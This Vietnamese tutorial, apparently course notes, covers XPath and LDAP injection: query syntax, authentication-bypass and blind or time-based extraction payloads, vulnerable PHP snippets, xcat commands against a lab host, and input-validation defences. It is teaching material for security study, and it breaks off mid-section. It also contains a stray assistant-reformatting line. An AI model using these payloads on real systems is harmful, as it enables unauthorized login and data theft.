# Giới thiệu về tấn công Injection

Lỗ hổng injection là một trong những vấn đề bảo mật phổ biến nhất và luôn nằm trong danh sách OWASP Top Ten kể từ lần phát hành đầu tiên vào năm 2003. Các dạng tấn công injection được biết đến rộng rãi bao gồm:

- **SQL Injection**
- **Command Injection**
- **Cross-Site Scripting (XSS)**

## 1. Các loại tấn công Injection phổ biến

## 1.1. XPath Injection

### Giới thiệu:
XPath là ngôn ngữ truy vấn dữ liệu cho tài liệu XML, tương tự như SQL cho cơ sở dữ liệu.

### Vấn đề bảo mật:
Lỗ hổng xảy ra khi dữ liệu đầu vào của người dùng được đưa trực tiếp vào truy vấn XPath mà không được kiểm tra. Điều này cho phép kẻ tấn công truy vấn và truy xuất toàn bộ tài liệu XML, gây nguy hiểm cho dữ liệu của ứng dụng.

## 1.2. LDAP Injection

### Giới thiệu:
LDAP (Lightweight Directory Access Protocol) là giao thức truy cập các máy chủ thư mục như Active Directory (AD).

### Vấn đề bảo mật:
Lỗ hổng LDAP Injection xuất hiện khi dữ liệu đầu vào của người dùng được đưa vào bộ lọc tìm kiếm LDAP mà không được kiểm tra. Điều này có thể dẫn đến:
- **Bypass xác thực**: Kẻ tấn công có thể vượt qua cơ chế xác thực nếu truy vấn LDAP được triển khai sai.
- **Mất dữ liệu**: Kẻ tấn công có thể truy xuất hoặc thay đổi dữ liệu trong máy chủ thư mục.

## 1.3. HTML Injection trong PDF Generators

### Giới thiệu:
PDF là định dạng tài liệu phổ biến được sử dụng để phân phối thông tin. Nhiều ứng dụng web có tính năng chuyển đổi dữ liệu sang định dạng PDF bằng cách sử dụng các thư viện tạo PDF.

### Vấn đề bảo mật:
Dữ liệu đầu vào của người dùng thường được đưa trực tiếp vào tài liệu PDF mà không được kiểm tra. Điều này có thể dẫn đến lỗ hổng HTML Injection, gây ra các rủi ro như:
- **Server-Side Request Forgery (SSRF)**: Kẻ tấn công có thể ép máy chủ gửi yêu cầu HTTP đến một địa chỉ tùy ý.
- **Local File Inclusion (LFI)**: Kẻ tấn công có thể bao gồm các tệp cục bộ vào tài liệu PDF, dẫn đến rò rỉ thông tin hệ thống.

# 2. Giới thiệu về XPath Injection

## 2.1. XPath là gì?

XPath (XML Path Language) là một ngôn ngữ truy vấn dữ liệu XML, tương tự như SQL cho cơ sở dữ liệu. XPath được sử dụng để truy vấn và trích xuất dữ liệu từ các tài liệu XML.

Lỗ hổng XPath Injection xảy ra khi đầu vào của người dùng được đưa vào truy vấn XPath mà không được kiểm tra và làm sạch, tương tự như lỗ hổng SQL Injection. Điều này có thể cho phép kẻ tấn công truy xuất toàn bộ tài liệu XML.

## 2.2. Cấu trúc và thuật ngữ của XPath

- **XML Declaration**: Tài liệu XML bắt đầu bằng khai báo XML, ví dụ: `<?xml version="1.0" encoding="UTF-8"?>`.
- **Root Node**: Là phần tử gốc của tài liệu XML, ví dụ: `<academy_modules>`.
- **Element Node**: Các phần tử như `<module>`, `<title>`.
- **Attribute Node**: Các thuộc tính như `co-author="LTNB0B"`, `difficulty="medium"`.
- **Comment Node**: Chứa các chú thích, ví dụ: `<!-- this is a comment -->`.
- **Text Node**: Chứa dữ liệu văn bản, ví dụ: `Web Attacks`, `LTNB0B`.

## 2.3. Truy vấn cơ bản với XPath

Mỗi truy vấn XPath sẽ chọn một tập hợp các node từ tài liệu XML, và bắt đầu từ một **context node** (điểm khởi đầu).

Ví dụ truy vấn cơ bản:
- `module`: Chọn tất cả các node con `module` từ context node.
- `/`: Chọn root node của tài liệu.
- `//`: Chọn tất cả các node con từ context node.
- `.`: Chọn context node hiện tại.
- `..`: Chọn parent node của context node hiện tại.
- `@difficulty`: Chọn node thuộc tính `difficulty`.
- `text()`: Chọn tất cả các node văn bản con.

## 2.4. Predicates trong XPath

**Predicates** là bộ lọc cho kết quả truy vấn, tương tự như mệnh đề `WHERE` trong SQL. Các bộ lọc được chứa trong dấu ngoặc vuông `[]`.

Ví dụ:
- `/academy_modules/module[1]`: Chọn module con đầu tiên của `academy_modules`.
- `/academy_modules/module[last()]`: Chọn module con cuối cùng của `academy_modules`.
- `//module[tier=2]/title`: Chọn title của tất cả các module có `tier` bằng 2.

## 2.5. Wildcards và Union trong XPath

**Wildcards** được sử dụng khi không quan tâm đến loại node:
- `node()`: Khớp với bất kỳ node nào.
- `*`: Khớp với bất kỳ element node nào.
- `@*`: Khớp với bất kỳ attribute node nào.

**Union**: Kết hợp nhiều truy vấn XPath với toán tử `|`.

Ví dụ: 
- `//module[tier=2]/title/text() | //module[tier=3]/title/text()`: Chọn `text()` của tất cả các `title` từ `module` có `tier` bằng 2 hoặc 3.

## 2.6. Toán tử hỗ trợ trong Predicates

Các toán tử hỗ trợ trong XPath:
- `+`: Phép cộng
- `-`: Phép trừ
- `*`: Phép nhân
- `div`: Phép chia
- `=`: Bằng
- `!=`: Khác
- `<`, `<=`: Nhỏ hơn, nhỏ hơn hoặc bằng
- `>`, `>=`: Lớn hơn, lớn hơn hoặc bằng
- `or`: Hoặc logic
- `and`: Và logic
- `mod`: Phép chia lấy dư

## Tóm tắt

XPath Injection là một dạng tấn công phổ biến khi dữ liệu đầu vào không được kiểm tra, cho phép kẻ tấn công khai thác và truy vấn dữ liệu XML một cách bất hợp pháp. Để khai thác hiệu quả, kẻ tấn công có thể sử dụng các wildcard, predicates, và toán tử trong XPath để trích xuất dữ liệu từ tài liệu XML, gây rò rỉ thông tin nhạy cảm.


# 3. XPath Injection để Bypass Xác Thực

## 3.1. Tổng quan về XPath Injection để bypass xác thực

XPath Injection tương tự như SQL Injection, có thể được sử dụng để vượt qua cơ chế xác thực của ứng dụng web.

Các truy vấn XPath thường được sử dụng để kiểm tra tên đăng nhập và mật khẩu từ tài liệu XML. Nếu đầu vào của người dùng không được kiểm tra kỹ lưỡng, kẻ tấn công có thể chèn các payload để bypass xác thực.

## 3.2. Ví dụ về xác thực với truy vấn XPath

Ví dụ tài liệu XML chứa thông tin người dùng:

```xml
<users>
    <user>
        <name first="Kaylie" last="Grenvile"/>
        <id>1</id>
        <username>kgrenvile</username>
        <password>P@ssw0rd!</password>
    </user>
    <user>
        <name first="Admin" last="Admin"/>
        <id>2</id>
        <username>admin</username>
        <password>admin</password>
    </user>
    <user>
        <name first="Academy" last="Student"/>
        <id>3</id>
        <username>htb-stdnt</username>
        <password>Academy_student!</password>
    </user>
</users>
```

Truy vấn XPath xác thực:

```php
$query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . $_POST['password'] . "']";
$results = $xml->xpath($query);
```

## 3.3. Payload bypass xác thực cơ bản

Kẻ tấn công có thể chèn đầu vào như: `' or '1'='1` để làm cho truy vấn luôn trả về true.

Truy vấn sau khi chèn payload:
```xpath
/users/user[username/text()='' or '1'='1' and password/text()='' or '1'='1']
```

Truy vấn này sẽ trả về tất cả các node user, cho phép kẻ tấn công đăng nhập dưới tài khoản đầu tiên (kgrenvile).

## 3.4. Bypass xác thực với người dùng cụ thể

Để đăng nhập dưới tài khoản admin, kẻ tấn công có thể sử dụng payload: `admin' or '1'='1`

Truy vấn XPath:
```xpath
/users/user[username/text()='admin' or '1'='1' and password/text()='abc']
```

## 3.5. Khai thác nâng cao khi mật khẩu được hash

Trong thực tế, mật khẩu thường được hash trước khi đưa vào truy vấn:

```php
$query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . md5($_POST['password']) . "']";
```

## 3.6. Payload bypass với or true()

Kẻ tấn công có thể sử dụng payload: `' or true() or '`

Truy vấn XPath:
```xpath
/users/user[username/text()='' or true() or '' and password/text()='hashed_password']
```

## 3.7. Sử dụng vị trí để tìm người dùng cụ thể

Kẻ tấn công có thể lặp qua các người dùng bằng cách sử dụng `position()`.

Payload ví dụ: `' or position()=2 or '`

Truy vấn XPath:
```xpath
/users/user[username/text()='' or position()=2 or '' and password/text()='hashed_password']
```

## 3.8. Tìm kiếm người dùng theo chuỗi con

Nếu biết một phần tên đăng nhập, kẻ tấn công có thể sử dụng hàm `contains()`.

Payload ví dụ: `' or contains(.,'admin') or '`

Truy vấn XPath:
```xpath
/users/user[username/text()='' or contains(.,'admin') or '' and password/text()='hashed_password']
```

## Tóm tắt

XPath Injection có thể được khai thác để vượt qua cơ chế xác thực bằng cách chèn các payload hợp lý, đặc biệt khi đầu vào không được kiểm tra và làm sạch. Các phương pháp bao gồm:
- Sử dụng `or true()`
- Sử dụng `position()`
- Sử dụng `contains()`

Các phương pháp này giúp kẻ tấn công truy cập trái phép vào hệ thống mà không cần mật khẩu hợp lệ.

# 4. Trích xuất dữ liệu (Data Exfiltration) qua XPath Injection

## 4.1. Tổng quan về trích xuất dữ liệu

Sau khi đã bypass xác thực thông qua XPath Injection, kẻ tấn công có thể tiếp tục khai thác để trích xuất dữ liệu từ tài liệu XML.

Các kỹ thuật trích xuất dữ liệu tương tự như khai thác dựa trên UNION trong SQL Injection, giúp kẻ tấn công truy vấn dữ liệu tùy ý từ tài liệu XML.

## 4.2. Xác nhận lỗ hổng XPath Injection

Để xác nhận lỗ hổng, có thể thử gửi payload sau:

**Payload**: `SOMETHINGINVALID') or ('1'='1`

Truy vấn XPath sau khi chèn payload:
```xpath
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID') or ('1'='1')]
```

**Giải thích:**
- Mặc dù chuỗi tìm kiếm "SOMETHINGINVALID" là không hợp lệ
- Nhưng toán tử `or ('1'='1')` sẽ làm cho truy vấn luôn trả về true
- Dẫn đến việc chọn tất cả các node ở mức đó
- Kết quả là ứng dụng web sẽ trả về tất cả các giá trị tìm thấy, xác nhận rằng lỗ hổng XPath Injection tồn tại

## 4.3. Kỹ thuật trích xuất dữ liệu từ tài liệu XML

Cách đơn giản nhất để trích xuất toàn bộ dữ liệu là tạo truy vấn trả về tất cả các node văn bản trong tài liệu.

**Payload**: `| //text()`

Truy vấn XPath sau khi chèn payload:
```xpath
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID') or ('1'='1')]/../../..//text()
```

**Giải thích:**
- Payload sử dụng toán tử `|` (tương tự như UNION trong SQL) để thêm một truy vấn mới
- Truy vấn `../../..//text()` sẽ di chuyển ngược lên root của tài liệu và chọn tất cả các node văn bản

## 4.4. Trích xuất toàn bộ tài liệu XML

Sử dụng payload: 
```
SOMETHINGINVALID') or ('1'='1
```
và đặt giá trị tham số f là `../../..//text()`

Truy vấn XPath kết quả:
```xpath
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID') or ('1'='1')]/../../..//text()
```

**Giải thích:**
- Toán tử `or ('1'='1')` làm cho điều kiện luôn đúng
- Giúp truy vấn chọn tất cả các node văn bản từ root của tài liệu
- Kết quả là toàn bộ nội dung văn bản của tài liệu XML sẽ được trả về
- Cho phép kẻ tấn công trích xuất dữ liệu một cách dễ dàng

## Tóm tắt

Kỹ thuật XPath Injection có thể được sử dụng để:
- Bypass xác thực 
- Trích xuất dữ liệu từ tài liệu XML
- Thông qua việc sử dụng các toán tử như `or` và `|`
- Kẻ tấn công có thể thực hiện truy vấn trả về toàn bộ nội dung văn bản của tài liệu
- Tương tự như khai thác UNION-based trong SQL Injection

# 5. Khai thác nâng cao để trích xuất dữ liệu (Advanced Data Exfiltration)

## 5.1. Thách thức khi trích xuất dữ liệu

Trong một số trường hợp, việc trích xuất dữ liệu gặp phải những thách thức:
- Ứng dụng web chỉ hiển thị số lượng kết quả giới hạn (ví dụ: chỉ 5 kết quả đầu tiên)
- Việc trích xuất toàn bộ tài liệu XML trong một lần trở nên không khả thi
- Cần duyệt qua từng phần của tài liệu XML
- Thực hiện truy vấn lặp lại để lấy được toàn bộ dữ liệu

## 5.2. Xác định độ sâu của tài liệu XML

Để bắt đầu, cần xác định độ sâu của schema XML thông qua:
- Thử truy vấn với các payload không trả về kết quả
- Thêm các truy vấn phụ để tìm hiểu cấu trúc schema

**Ví dụ payload:**
- Tham số q: `SOMETHINGINVALID`
- Tham số f: `fullstreetname | /*[1]`

Truy vấn XPath:
```xpath
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID')]/fullstreetname | /*[1]
```

**Giải thích:**
- Truy vấn phụ `/*[1]` bắt đầu từ root node `/`
- Di chuyển xuống một node con đầu tiên và chọn node đó
- Nếu node root chứa nhiều node con, kết quả sẽ là một mảng
- Khiến ứng dụng web không thể hiển thị kết quả

## 5.3. Xác định độ sâu schema qua truy vấn lặp lại

Quá trình thử nghiệm:
```
f = fullstreetname /*[1] → Kết quả trống
f = fullstreetname /[1]/[1] → Kết quả trống  
f = fullstreetname /[1]/[1]/*[1] → Kết quả trống
f = fullstreetname /[1]/[1]/[1]/[1] → Kết quả trống
f = fullstreetname /[1]/[1]/[1]/[1]/*[1] → Có kết quả
```

**Kết luận:** Độ sâu của dữ liệu là 4

## 5.4. Trích xuất dữ liệu thông qua lặp lại vị trí

Sau khi xác định độ sâu schema, ta có thể tăng dần chỉ số vị trí:

```xpath
/[1]/[1]/[1]/[1]
/[1]/[1]/[1]/[2]
/[1]/[1]/[1]/[3]
/[1]/[1]/[1]/[4]
```

Truy vấn này sẽ trích xuất thông tin về các node con như:
- Tên đầy đủ của đường
- Tên viết tắt
- Loại đường

## 5.5. Trích xuất dữ liệu từ các tập dữ liệu khác

Ví dụ tài liệu XML có cấu trúc phức tạp:

```xml
<dataset>
  <streets>
    <street>
      <fullstreetname>01ST ST</fullstreetname>
      <streetname>01ST</streetname>
      <street_type>ST</street_type>
    </street>
  </streets>
  <users>
    <group name="users">
      <user>
        <username>test</username>
        <password>test</password>
      </user>
    </group>
    <group name="admins">
      <user>
        <username>admin</username>
        <password>admin</password>
      </user>
    </group>
  </users>
</dataset>
```

**Chú ý:**
- Các node street nằm ở độ sâu 3
- Các node user nằm ở độ sâu 4
- Cần xác định độ sâu mới khi chuyển sang trích xuất thông tin người dùng

## 5.6. Trích xuất thông tin người dùng

Truy vấn để trích xuất dữ liệu người dùng:

```xpath
/[1]/[2]/[1]/[1]/*[1]
/[1]/[2]/[1]/[1]/*[2]
/[1]/[2]/[1]/[1]/*[3]
/[1]/[2]/[1]/[1]/*[4]
```

Kết quả có thể trích xuất:
- Tên người dùng
- Mật khẩu hash
- Mô tả

## 5.7. Lưu ý khi khai thác tự động

Để khai thác hiệu quả:
- Nên sử dụng script tự động để duyệt qua các chỉ số vị trí
- Trích xuất dữ liệu một cách có hệ thống
- Việc thực hiện thủ công có thể không khả thi với:
  - Tài liệu XML lớn
  - Cấu trúc phức tạp

## Tóm tắt

Kỹ thuật trích xuất nâng cao trong XPath Injection:
- Giúp vượt qua giới hạn về số lượng kết quả trả về
- Xác định độ sâu schema
- Sử dụng các truy vấn lặp lại
- Cho phép trích xuất toàn bộ nội dung tài liệu XML một cách hiệu quả

# 6. Khai thác Blind XPath Injection

## 6.1. Tổng quan về Blind XPath Injection

Đặc điểm của Blind XPath Injection:
- Ứng dụng web không hiển thị kết quả của truy vấn XPath trực tiếp
- Có thể khai thác tương tự như Blind SQL Injection
- XPath không hỗ trợ hàm `sleep()`
- Cần dựa vào chỉ báo (indicator) từ ứng dụng web
- Cho phép trích xuất dữ liệu dựa trên thông tin nhị phân

## 6.2. Phương pháp khai thác

Kỹ thuật khai thác sử dụng các hàm cơ bản:

- `name()`: Trả về tên của node
- `substring()`: Trích xuất từng ký tự trong tên node
- `string-length()`: Xác định độ dài của tên node  
- `count()`: Trả về số lượng node con

**Quy trình khai thác:**
1. Trích xuất thông tin cấu trúc XML trước
2. Sau đó mới trích xuất dữ liệu cần thiết

## 6.3. Xác nhận lỗ hổng XPath Injection

**Payload thử nghiệm:**
```xpath
invalid' or '1'='1
```

Truy vấn XPath kết quả:
```xpath
/users/user[username='invalid' or '1'='1']
```

**Xác nhận lỗ hổng:**
- Nếu ứng dụng phản hồi giống như khi cung cấp tên người dùng hợp lệ
- Thì lỗ hổng XPath Injection tồn tại

## 6.4. Trích xuất độ dài tên node

**Payload để trích xuất độ dài tên node gốc:**
```xpath
invalid' or string-length(name(/*[1]))=1 and '1'='1
```

**Giải thích:**
- `/*[1]` chọn node gốc
- Nếu truy vấn không trả về kết quả:
  - Cần tăng giá trị độ dài
  - Cho đến khi tìm được độ dài chính xác
- Ví dụ: Độ dài tên của node gốc là 5

Tôi sẽ giúp định dạng lại nội dung trên theo Markdown để dễ đọc hơn:

# 6.5. Trích xuất tên của node

Sau khi biết độ dài tên node, chúng ta có thể trích xuất từng ký tự bằng cách sử dụng hàm `substring()`.

**Payload ví dụ:**
```xpath
invalid' or substring(name(/*[1]),1,1)='a' and '1'='1
```

**Giải thích:**
- Payload này kiểm tra xem ký tự đầu tiên của tên node có phải là 'a' hay không
- Lặp qua tất cả các ký tự cho đến khi trích xuất được toàn bộ tên, ví dụ: users

# 6.6. Trích xuất số lượng node con

Để xác định số lượng node con, sử dụng hàm `count()`:

```xpath
invalid' or count(/users/*)=1 and '1'='1
```

**Giải thích:**
Truy vấn này trả về dữ liệu nếu số lượng node con là 1. Tăng giá trị cho đến khi tìm được số lượng chính xác.

# 6.7. Trích xuất dữ liệu từ node con

Sau khi xác định cấu trúc schema, chúng ta có thể trích xuất dữ liệu từ các node con.

**Payload trích xuất độ dài tên người dùng:**
```xpath
invalid' or string-length(/users/user[1]/username)=1 and '1'='1
```

**Payload trích xuất từng ký tự:**
```xpath
invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1
```

**Giải thích:**
Lặp qua từng ký tự cho đến khi trích xuất được toàn bộ tên người dùng, ví dụ: admin

# 6.8. Khai thác dựa trên thời gian xử lý (Time-based Exploitation)

XPath không có hàm `sleep()`, nhưng có thể tạo sự khác biệt về thời gian xử lý để xác định kết quả của truy vấn.

**Payload ví dụ:**
```xpath
invalid' or substring(/users/user[1]/username,1,1)='a' and count((//.)[count((//.))]) and '1'='1
```

**Giải thích:**
- Nếu điều kiện `substring(/users/user[1]/username,1,1)='a'` là true, phần thứ hai của điều kiện `and` sẽ được đánh giá
- `count((//.)[count((//.))])` yêu cầu ứng dụng duyệt qua toàn bộ tài liệu XML, dẫn đến thời gian xử lý dài hơn
- Điều này tạo ra sự khác biệt về thời gian xử lý, cho phép xác định kết quả của truy vấn

# 6.9. Lưu ý khi khai thác dựa trên thời gian

- Đối với các tài liệu XML lớn, payload có thể gây quá tải máy chủ và dẫn đến tấn công từ chối dịch vụ (DoS)
- Cần cẩn thận khi sử dụng kỹ thuật này, đặc biệt trong môi trường thực tế

# Tóm tắt

Blind XPath Injection có thể khai thác bằng cách:
- Sử dụng các hàm như `name()`, `substring()`, và `count()` để trích xuất dữ liệu 
- Áp dụng kỹ thuật dựa trên thời gian xử lý để tạo chỉ báo cho kết quả truy vấn
- Tự động hóa quá trình khai thác bằng script để tăng hiệu quả

# 7. Phòng chống XPath Injection và công cụ hỗ trợ khai thác

## 7.1. Công cụ hỗ trợ khai thác XPath Injection

Một trong những công cụ phổ biến để khai thác XPath Injection là **xcat**, cung cấp nhiều tính năng hỗ trợ phát hiện và khai thác lỗ hổng.

**Cài đặt xcat:**
```bash
pip3 install cython
pip3 install xcat
```

**Các lệnh chính của xcat:**
- `detect`: Phát hiện lỗ hổng XPath Injection
- `injections`: Hiển thị tất cả các loại injection được hỗ trợ
- `ip`: Hiển thị địa chỉ IP hiện tại 
- `run`: Trích xuất tài liệu XML thông qua khai thác
- `shell`: Mở shell của xcat để thực hiện lệnh hệ thống

**Ví dụ sử dụng xcat:**
```bash
xcat detect http://172.17.0.2/index.php q q=BAR f=fullstreetname --true-string='!No Result'
```

**Giải thích:**
- Tham số `q` là tham số dễ bị tổn thương
- `--true-string='!No Result'` chỉ định phản hồi không chứa chuỗi "No Result" khi truy vấn có kết quả

**Khai thác Blind XPath Injection:**
```bash
xcat detect http://172.17.0.2/index.php username username=admin -m POST --true-string=successfully --encode FORM
```

**Giải thích:**
- `-m POST`: Gửi payload dưới dạng POST request
- `--true-string=successfully`: Phản hồi chứa "successfully" khi truy vấn trả về dữ liệu

**Trích xuất toàn bộ tài liệu XML:**
```bash
xcat run http://172.17.0.2/index.php username username=admin -m POST --true-string=successfully --encode FORM
```

## 7.2. Phòng chống XPath Injection

Không giống SQL, nhiều ngôn ngữ lập trình và thư viện không cung cấp prepared statements hoặc stored procedures cho XPath. Do đó việc kiểm tra và làm sạch dữ liệu đầu vào là phương pháp phòng chống hiệu quả nhất.

### Các phương pháp phòng chống:

**1. Kiểm tra và làm sạch dữ liệu đầu vào:**
- Tất cả dữ liệu từ người dùng phải được coi là không đáng tin cậy
- Kiểm tra dữ liệu trước khi đưa vào truy vấn XPath
- Sử dụng whitelist chỉ cho phép ký tự chữ và số:

```php
if (!preg_match('/^[a-zA-Z0-9]+$/', $_POST['username'])) {
    die("Invalid input!");
}
```

**2. Xác thực kiểu dữ liệu:**
```php
if (!ctype_digit($_GET['id'])) {
    die("Invalid ID!");
}
```

**3. Kiểm tra ngữ nghĩa dữ liệu:**
```php
$valid_options = ['fullstreetname', 'streetname'];
if (!in_array($_GET['f'], $valid_options)) {
    die("Invalid option!");
}
```

**4. Sử dụng blacklist (chặn ký tự đặc biệt):**
Chặn các ký tự điều khiển trong XPath:
- Dấu nháy (`'`, `"`)  
- Dấu gạch chéo (`/`)
- Ký tự đặc biệt (`@`, `=`, `*`) 
- Dấu ngoặc (`[`, `]`, `(`, `)`)

```php
$input = str_replace(["'", '"', "/", "@", "=", "*", "[", "]", "(", ")"], "", $_POST['input']);
```

## 7.3. Tại sao whitelist tốt hơn blacklist?

- Whitelist chỉ cho phép các ký tự an toàn, giảm thiểu khả năng bỏ sót ký tự nguy hiểm
- Blacklist có thể bỏ sót các ký tự hoặc chuỗi mới được sử dụng để khai thác

# Tóm tắt

Phòng chống XPath Injection cần:
- Làm sạch dữ liệu đầu vào nghiêm ngặt
- Sử dụng các biện pháp kiểm tra hợp lệ
- Công cụ như xcat hỗ trợ phát hiện và khai thác
- Ưu tiên sử dụng whitelist thay vì blacklist


# Giới thiệu về LDAP Injection

## 1. LDAP là gì?
Lightweight Directory Access Protocol (LDAP) là một giao thức dùng để truy cập các máy chủ thư mục như Active Directory (AD). LDAP cho phép các ứng dụng web tích hợp với AD hoặc các dịch vụ thư mục khác để thực hiện xác thực hoặc truy vấn dữ liệu.  
Lỗ hổng LDAP Injection xảy ra khi dữ liệu đầu vào của người dùng được chèn vào các truy vấn LDAP mà không qua kiểm tra và làm sạch đúng cách, dẫn đến nguy cơ bị khai thác.

## 1.1. Thuật ngữ cơ bản trong LDAP
- **Directory Server (DS)**: Là máy chủ lưu trữ dữ liệu, tương tự như một máy chủ cơ sở dữ liệu. Ví dụ: OpenLDAP.
- **LDAP Entry**: Chứa dữ liệu cho một thực thể và gồm 3 thành phần chính:
  - **Distinguished Name (DN)**: Là định danh duy nhất cho mỗi entry, gồm các Relative Distinguished Names (RDNs). Ví dụ: `uid=admin,dc=hackthebox,dc=com`.
  - **Attributes**: Chứa dữ liệu, bao gồm loại thuộc tính và giá trị.
  - **Object Classes**: Định nghĩa kiểu đối tượng, ví dụ: Person hoặc Group.

## 1.2. Các thao tác trong LDAP
- **Bind Operation**: Xác thực client với máy chủ.
- **Unbind Operation**: Đóng kết nối giữa client và máy chủ.
- **Add Operation**: Thêm entry mới.
- **Delete Operation**: Xóa entry.
- **Modify Operation**: Chỉnh sửa entry.
- **Search Operation**: Tìm kiếm các entry phù hợp với truy vấn.

## 1.3. Cú pháp truy vấn tìm kiếm LDAP (LDAP Search Filter)

Trong LDAP, truy vấn tìm kiếm được gọi là **search filters**, gồm ba thành phần chính:

- **Attribute**: Thuộc tính cần tìm kiếm.
- **Operand**: Toán tử so sánh.
- **Value**: Giá trị tìm kiếm.

**Ví dụ về operand phổ biến**:

| Operand | Ví dụ               | Mô tả                                                                            |
|---------|----------------------|-----------------------------------------------------------------------------------|
| =       | `(name=Kaylie)`     | Khớp với tất cả các entry có thuộc tính `name` là "Kaylie".                       |
| >=      | `(uid>=10)`         | Khớp với tất cả các entry có `uid` lớn hơn hoặc bằng 10.                          |
| <=      | `(uid<=10)`         | Khớp với tất cả các entry có `uid` nhỏ hơn hoặc bằng 10.                          |
| ~=      | `(name~=Kaylie)`    | Khớp xấp xỉ với giá trị "Kaylie".                                                 |

**Toán tử kết hợp trong LDAP Search Filters**:

| Operand | Ví dụ                                         | Mô tả                                                                   |
|---------|-----------------------------------------------|-------------------------------------------------------------------------|
| And `&` | `(&(name=Kaylie)(title=Manager))`            | Khớp với các entry có `name` là "Kaylie" và `title` là "Manager".       |
| Or `|`  | `(|(name=Kaylie)(title=Manager))`            | Khớp với các entry có `name` là "Kaylie" hoặc `title` là "Manager".     |
| Not `!` | `(!(name=Kaylie))`                            | Khớp với các entry có `name` khác "Kaylie".                             |

**Ký tự đại diện (Wildcard) trong LDAP**:

| Ví dụ            | Mô tả                                                                   |
|------------------|-------------------------------------------------------------------------|
| `(name=*)`       | Khớp với tất cả các entry có thuộc tính `name`.                         |
| `(name=K*)`      | Khớp với tất cả các entry có `name` bắt đầu bằng chữ "K".               |
| `(name=*a*)`     | Khớp với tất cả các entry có `name` chứa chữ "a".                       |

## 2. Các loại thuộc tính phổ biến trong LDAP

| Thuộc tính          | Mô tả                                  |
|---------------------|----------------------------------------|
| `cn`                | Tên đầy đủ (Full Name)                |
| `givenName`         | Tên đầu tiên (First Name)             |
| `sn`                | Họ (Last Name)                        |
| `uid`               | User ID                               |
| `objectClass`       | Loại đối tượng (Object Type)          |
| `distinguishedName` | Distinguished Name                    |
| `ou`                | Đơn vị tổ chức (Organizational Unit)  |
| `title`             | Chức vụ (Title)                       |
| `telephoneNumber`   | Số điện thoại                         |
| `description`       | Mô tả                                 |
| `mail`              | Địa chỉ email                         |
| `userPassword`      | Mật khẩu người dùng                   |

## 3. Lỗ hổng LDAP Injection

Lỗ hổng LDAP Injection xảy ra khi dữ liệu đầu vào của người dùng được chèn trực tiếp vào các truy vấn LDAP mà không qua kiểm tra hoặc lọc, cho phép kẻ tấn công chèn các truy vấn độc hại, tương tự như SQL Injection.

**Ví dụ về lỗ hổng LDAP Injection trong PHP**

Dưới đây là một đoạn code PHP dễ bị tấn công qua LDAP Injection:

```php
$ldap_filter = "(uid=" . $_POST['username'] . ")";
$result = ldap_search($ldap_conn, $base_dn, $ldap_filter);
```

**Payload tấn công**: `*)(uid=*))(|(uid=*`

**Truy vấn LDAP kết quả**: `((uid=*)(uid=*))(|(uid=*))`

Khi thực hiện truy vấn này, kẻ tấn công có thể truy vấn tất cả các entry mà không cần một tên người dùng hợp lệ, giúp họ truy xuất dữ liệu nhạy cảm từ LDAP.

## 4. LDAP Authentication Bypass

LDAP (Lightweight Directory Access Protocol) là giao thức phổ biến dùng để xác thực người dùng trong các ứng dụng web, đặc biệt là khi tích hợp với Active Directory (AD). LDAP Injection là kỹ thuật lợi dụng lỗ hổng đầu vào để thay đổi bộ lọc tìm kiếm LDAP nhằm vượt qua quá trình xác thực.

#### Cấu trúc Bộ Lọc LDAP

Trong quá trình xác thực người dùng, bộ lọc LDAP có thể có cấu trúc như sau:

```ldap
(&(uid=admin)(userPassword=password123))
```

- `uid`: Tên người dùng.
- `userPassword`: Mật khẩu.

#### Các Phương Pháp Bypass LDAP Authentication Qua LDAP Injection

**1. Sử dụng Ký Tự Wildcard (*) để Bỏ Qua Mật Khẩu**

Ký tự `*` trong LDAP là ký tự wildcard, cho phép bỏ qua kiểm tra mật khẩu. Ví dụ:

- **Tên người dùng**: `admin`
- **Mật khẩu**: `*`

Bộ lọc LDAP sẽ trở thành:

```ldap
(&(uid=admin)(userPassword=*))
```

Điều này cho phép kẻ tấn công đăng nhập mà không cần biết mật khẩu.

**2. Sử dụng Ký Tự Wildcard trong Trường Tên Người Dùng**

Nếu không biết tên người dùng hợp lệ, kẻ tấn công có thể sử dụng wildcard trong trường tên người dùng, dẫn đến bộ lọc như sau:

```ldap
(&(uid=*)(userPassword=*))
```

Bộ lọc này sẽ khớp với mọi mục có `uid` và `userPassword`, cho phép kẻ tấn công đăng nhập dưới danh nghĩa người dùng đầu tiên trong danh sách.

**3. Sử dụng Substring của Tên Người Dùng**

Khi biết một phần tên người dùng hợp lệ (chẳng hạn, biết tên bắt đầu bằng “admin”), kẻ tấn công có thể sử dụng substring:

```ldap
(&(uid=admin*)(userPassword=*))
```

Bộ lọc này sẽ khớp với mọi mục có `uid` bắt đầu bằng "admin", giúp bỏ qua kiểm tra mật khẩu và đăng nhập thành công.

**4. Bypass Xác Thực mà Không Dùng Wildcard**

Trong trường hợp ứng dụng chặn ký tự wildcard (*), kẻ tấn công vẫn có thể bypass xác thực bằng cách thay đổi cấu trúc bộ lọc LDAP. Ví dụ:

- **Tên người dùng**: `admin)(|(&`
- **Mật khẩu**: `abc`

Bộ lọc LDAP sẽ trở thành:

```ldap
(&(uid=admin)(|(&)(userPassword=abc)))
```

Cấu trúc `( |(&) )` tạo điều kiện OR với toán tử true `( & )`, giúp bypass kiểm tra mật khẩu sai và đăng nhập thành công nếu cung cấp tên người dùng hợp lệ.

### Kết Luận

LDAP Injection là kỹ thuật tấn công mạnh mẽ để bypass xác thực trong các ứng dụng dùng LDAP. Các phương pháp tấn công chính gồm:

- Sử dụng ký tự wildcard
- Chèn điều kiện OR
- Thay đổi cấu trúc bộ lọc LDAP.

**Phòng Chống**: Để ngăn chặn lỗ hổng LDAP Injection, cần kiểm tra và lọc chặt chẽ tất cả đầu vào của người dùng trước khi sử dụng trong truy vấn LDAP.

## 5. Exfiltration Dữ Liệu và Blind Exploitation với LDAP Injection

#### 1. Exfiltration Dữ Liệu

Nếu ứng dụng web hiển thị kết quả tìm kiếm cho người dùng, có thể thực hiện **exfiltration dữ liệu** bằng cách tiêm ký tự wildcard vào các trường tìm kiếm.

**Tiêm Wildcard vào Tên Người Dùng**

